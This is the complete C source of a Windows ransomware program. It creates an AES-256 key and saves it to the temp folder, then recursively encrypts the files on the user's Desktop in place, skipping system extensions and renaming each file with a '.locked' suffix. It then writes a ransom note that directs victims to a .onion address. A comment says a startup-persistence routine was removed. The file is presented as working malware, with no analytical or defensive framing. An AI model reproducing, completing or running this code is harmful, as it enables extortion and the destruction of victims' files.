#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlobj.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#define AES_BLOCK_SIZE 16

const char *whitelist_extensions[] = {
    ".sys", ".dll", ".exe", ".bat", ".com", ".ini", ".log", ".tmp"
};
const int whitelist_size = sizeof(whitelist_extensions) / sizeof(whitelist_extensions[0]);

int is_whitelisted(const char *filename) {
    const char *ext = strrchr(filename, '.');
    if (!ext) return 0;
    for (int i = 0; i < whitelist_size; i++) {
        if (_stricmp(ext, whitelist_extensions[i]) == 0) return 1;
    }
    return 0;
}

void generate_key(unsigned char *key, int key_len) {
    if (RAND_bytes(key, key_len) != 1) {
        MessageBox(NULL, "Error generating key!", "Error", MB_ICONERROR);
        exit(1);
    }
}

void log_key(unsigned char *key, int key_len) {
    char temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);

    char key_file_path[MAX_PATH];
    snprintf(key_file_path, MAX_PATH, "%s\\key.bin", temp_path);

    FILE *key_file = fopen(key_file_path, "wb");
    if (key_file) {
        fwrite(key, 1, key_len, key_file);
        fclose(key_file);
    } else {
        MessageBox(NULL, "Error writing encryption key!", "Error", MB_ICONERROR);
    }
}

void encrypt_file(const char *filename, unsigned char *key) {
    if (is_whitelisted(filename)) return;

    FILE *input = fopen(filename, "rb+");
    if (!input) return;

    fseek(input, 0, SEEK_END);
    long fsize = ftell(input);
    rewind(input);

    unsigned char *buffer = (unsigned char *)malloc(fsize);
    if (!buffer) {
        fclose(input);
        return;
    }

    fread(buffer, 1, fsize, input);
    rewind(input);

    unsigned char iv[AES_BLOCK_SIZE];
    if (RAND_bytes(iv, AES_BLOCK_SIZE) != 1) {
        free(buffer);
        fclose(input);
        return;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

    unsigned char *outbuf = (unsigned char *)malloc(fsize + AES_BLOCK_SIZE);
    int outlen, tmplen;

    EVP_EncryptUpdate(ctx, outbuf, &outlen, buffer, fsize);
    EVP_EncryptFinal_ex(ctx, outbuf + outlen, &tmplen);
    outlen += tmplen;

    rewind(input);
    fwrite(iv, 1, AES_BLOCK_SIZE, input);  // Prepend IV
    fwrite(outbuf, 1, outlen, input);  // Truncate if needed

    EVP_CIPHER_CTX_free(ctx);
    free(buffer);
    free(outbuf);
    fclose(input);

    char newname[MAX_PATH];
    snprintf(newname, MAX_PATH, "%s.locked", filename);
    MoveFileEx(filename, newname, MOVEFILE_REPLACE_EXISTING);
}

void encrypt_directory(const char *directory, unsigned char *key) {
    WIN32_FIND_DATA findData;
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", directory);

    HANDLE hFind = FindFirstFile(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) continue;

        char full_path[MAX_PATH];
        snprintf(full_path, MAX_PATH, "%s\\%s", directory, findData.cFileName);

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            encrypt_directory(full_path, key);
        } else {
            encrypt_file(full_path, key);
        }
    } while (FindNextFile(hFind, &findData));

    FindClose(hFind);
}

// Removed add_to_startup due to harmful redundancy and infinite encryption loop risks

void drop_ransom_note(const char *desktop_path) {
    char ransom_note_path[MAX_PATH];
    snprintf(ransom_note_path, MAX_PATH, "%s\\READ_ME.txt", desktop_path);

    FILE *note = fopen(ransom_note_path, "w");
    if (note) {
        fprintf(note, "Oops! Your files have been encrypted.\n"
                      "Don't try to recover them without contacting us.\n"
                      "Visit: cybercat0123.onion");
        fclose(note);
    }
}

int main() {
    unsigned char aes_key[32];
    generate_key(aes_key, 32);
    log_key(aes_key, 32);

    char desktop_path[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path) != S_OK) {
        MessageBox(NULL, "Error getting desktop path!", "Error", MB_ICONERROR);
        return 1;
    }

    encrypt_directory(desktop_path, aes_key);
    drop_ransom_note(desktop_path);

    return 0;
}
